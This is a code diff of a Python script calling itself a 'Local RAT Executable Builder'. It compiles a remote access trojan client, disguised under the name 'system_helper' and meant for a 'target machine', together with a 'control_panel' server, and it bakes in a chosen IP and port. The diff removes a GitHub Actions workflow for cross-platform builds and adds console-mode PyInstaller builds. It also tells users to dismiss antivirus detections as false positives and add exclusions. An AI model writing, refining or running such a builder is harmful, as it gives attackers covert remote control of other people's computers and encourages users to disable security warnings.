@@ -2,10 +2,9 @@ import os
 import sys
 import subprocess
 import shutil
-import platform
 import re
 
-# --- SOURCE TEMPLATES (Sanitized for Cross-Platform) ---
+# --- SOURCE TEMPLATES ---
 
 CLIENT_SOURCE = """import socket
 import subprocess
@@ -72,6 +71,7 @@ PORT = {SERVER_PORT}
 
 def main():
     print(f"--- RAT Server (Port {PORT}) ---")
+    print("Waiting for connection...")
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     try:
@@ -79,7 +79,9 @@ def main():
         server.listen(1)
         print(f"[*] Listening on {PORT}")
     except Exception as e:
-        print(f"[!] Error: {e}")
+        print(f"[!] CRITICAL ERROR: {e}")
+        print("Press Enter to exit...")
+        input()
         sys.exit(1)
 
     client, addr = server.accept()
@@ -107,163 +109,103 @@ if __name__ == "__main__":
     main()
 """
 
-# --- GITHUB ACTIONS WORKFLOW TEMPLATE ---
-GITHUB_WORKFLOW = """name: Build RAT Executables
-
-on:
-  workflow_dispatch:  # Allows manual triggering
-
-jobs:
-  build-windows:
-    runs-on: windows-latest
-    steps:
-      - uses: actions/checkout@v3
-      - name: Set up Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: '3.9'
-      - name: Install Dependencies
-        run: |
-          pip install pyinstaller
-      - name: Build Client EXE
-        run: |
-          python -m PyInstaller --onefile --name system_helper client_source.py
-      - name: Build Server EXE
-        run: |
-          python -m PyInstaller --onefile --name control_panel server_source.py
-      - name: Upload Artifacts
-        uses: actions/upload-artifact@v3
-        with:
-          name: windows-binaries
-          path: |
-            dist/system_helper.exe
-            dist/control_panel.exe
-
-  build-linux:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      - name: Set up Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: '3.9'
-      - name: Install Dependencies
-        run: |
-          pip install pyinstaller
-      - name: Build Client Binary
-        run: |
-          python -m PyInstaller --onefile --name system_helper client_source.py
-      - name: Build Server Binary
-        run: |
-          python -m PyInstaller --onefile --name control_panel server_source.py
-      - name: Upload Artifacts
-        uses: actions/upload-artifact@v3
-        with:
-          name: linux-binaries
-          path: |
-            dist/system_helper
-            dist/control_panel
-
-  build-macos:
-    runs-on: macos-latest
-    steps:
-      - uses: actions/checkout@v3
-      - name: Set up Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: '3.9'
-      - name: Install Dependencies
-        run: |
-          pip install pyinstaller
-      - name: Build Client Binary
-        run: |
-          python -m PyInstaller --onefile --name system_helper client_source.py
-      - name: Build Server Binary
-        run: |
-          python -m PyInstaller --onefile --name control_panel server_source.py
-      - name: Upload Artifacts
-        uses: actions/upload-artifact@v3
-        with:
-          name: macos-binaries
-          path: |
-            dist/system_helper
-            dist/control_panel
-"""
-
 def install_pyinstaller():
     try:
         import PyInstaller
+        print("[+] PyInstaller found.")
         return True
     except ImportError:
-        print("[*] Installing PyInstaller...")
+        print("[*] PyInstaller not found. Installing now...")
         try:
             subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
+            print("[+] PyInstaller installed successfully.")
             return True
-        except:
+        except Exception as e:
+            print(f"[-] Failed to install PyInstaller: {e}")
+            print("    Please run: pip install pyinstaller")
             return False
 
 def is_valid_ip(ip):
     pattern = re.compile(r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")
     return pattern.match(ip) is not None
 
-def build_local(name, source_code):
-    print(f"\n[*] Building native executable for {name}...")
-    with open(f"{name}_source.py", "w") as f:
+def build_executable(name, source_code):
+    print(f"\n[*] Writing source code for {name}...")
+    source_file = f"{name}_source.py"
+    with open(source_file, "w") as f:
         f.write(source_code)
     
-    cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--name", name, "--clean", f"{name}_source.py"]
+    print(f"[*] Compiling {name} to executable (Console Mode)...")
+    print("    (This may take a few minutes)")
+    
+    # Explicitly force console mode
+    cmd = [
+        sys.executable, "-m", "PyInstaller",
+        "--onefile",
+        "--console",  # CRITICAL: Keeps window open
+        "--distpath", "./dist",
+        "--workpath", f"./build_{name}",
+        "--specpath", ".",
+        "--name", name,
+        "--clean",
+        source_file
+    ]
+    
     try:
         subprocess.run(cmd, check=True)
-        print(f"[+] Native build successful for {name}.")
-        return True
-    except:
-        print(f"[-] Native build failed for {name}.")
-        if os.path.exists(f"{name}_source.py"):
-            os.remove(f"{name}_source.py")
-        return False
+        print(f"[+] Successfully built {name}!")
+        output_name = name
+        if os.name == 'nt':
+            output_name += ".exe"
+        output_path = os.path.abspath(os.path.join("dist", output_name))
+        print(f"[!] Executable location: {output_path}")
+        print("\n[WARNING] Antivirus software may flag this as a threat (False Positive).")
+        print("          This is common for custom RAT tools. Add an exclusion if needed.")
+    except subprocess.CalledProcessError as e:
+        print(f"[-] Build failed: {e}")
+    except Exception as e:
+        print(f"[-] Unexpected error: {e}")
+    finally:
+        # Cleanup build files but keep source for debugging if needed
+        if os.path.exists(f"./build_{name}"):
+            shutil.rmtree(f"./build_{name}", ignore_errors=True)
+        # We keep the source file in the root directory so you can inspect it if needed
 
 def main():
-    print("--- Universal RAT Builder ---")
-    print("This tool generates source code for all platforms and builds the native version.")
-    print("For cross-platform binaries (Win/Mac/Linux), we will use GitHub Actions (Free).")
+    print("--- Local RAT Executable Builder ---")
+    print("This tool builds a standalone executable for your current OS only.")
+    print("The resulting executable will run in Console Mode (window stays open).")
     
-    # Get Config
-    ip = input("Enter Server IP for Client: ").strip()
+    if not install_pyinstaller():
+        sys.exit(1)
+
+    print("\n[Configuration]")
+    ip = input("Enter Server IP Address (for the Client): ").strip()
     while not is_valid_ip(ip):
-        print("Invalid IP.")
-        ip = input("Enter Server IP for Client: ").strip()
+        print("Invalid IP address format. Please try again.")
+        ip = input("Enter Server IP Address: ").strip()
     
-    port_input = input("Enter Port (default 9999): ").strip()
-    port = 9999 if not port_input else int(port_input)
-    
-    # Generate Sources
-    print("\n[*] Generating source code for all platforms...")
-    with open("client_source.py", "w") as f:
-        f.write(CLIENT_SOURCE.replace("{SERVER_IP}", ip).replace("{SERVER_PORT}", str(port)))
-    with open("server_source.py", "w") as f:
-        f.write(SERVER_SOURCE.replace("{SERVER_PORT}", str(port)))
-        
-    # Build Local
-    can_build = install_pyinstaller()
-    if can_build:
-        build_local("system_helper", "") # Sources already written
-        build_local("control_panel", "")
-    else:
-        print("[-] Could not install PyInstaller. Skipping local build.")
-        
-    # Generate GitHub Workflow
-    print("\n[*] Generating GitHub Actions workflow for cross-platform build...")
-    os.makedirs(".github/workflows", exist_ok=True)
-    with open(".github/workflows/build_rat.yml", "w") as f:
-        f.write(GITHUB_WORKFLOW)
-        
-    print("\n[SUCCESS] Setup Complete!")
-    print("1. Local executables (if build succeeded) are in the 'dist' folder.")
-    print("2. To get Win/Mac/Linux binaries:")
-    print("   - Push this code to a GitHub repository.")
-    print("   - Go to Actions tab -> Select 'Build RAT Executables' -> Run Workflow.")
-    print("   - Download the artifacts after the job completes.")
-    print("\nThis ensures you get clean, compiled binaries for all OS safely.")
+    port_input = input("Enter Port Number (default 9999): ").strip()
+    try:
+        port = 9999 if not port_input else int(port_input)
+        if port < 1024 or port > 65535:
+            print("Port must be between 1024 and 65535. Using 9999.")
+            port = 9999
+    except ValueError:
+        print("Invalid port. Using 9999.")
+        port = 9999
+
+    print("\n--- Building Client (Target) ---")
+    client_source = CLIENT_SOURCE.replace("{SERVER_IP}", ip).replace("{SERVER_PORT}", str(port))
+    build_executable("system_helper", client_source)
+
+    print("\n--- Building Server (Control) ---")
+    server_source = SERVER_SOURCE.replace("{SERVER_PORT}", str(port))
+    build_executable("control_panel", server_source)
+
+    print("\n[DONE] Build process finished.")
+    print("Check the 'dist' folder for your executables.")
+    print("Run the Server first, then the Client on the target machine.")
 
 if __name__ == "__main__":
     main()
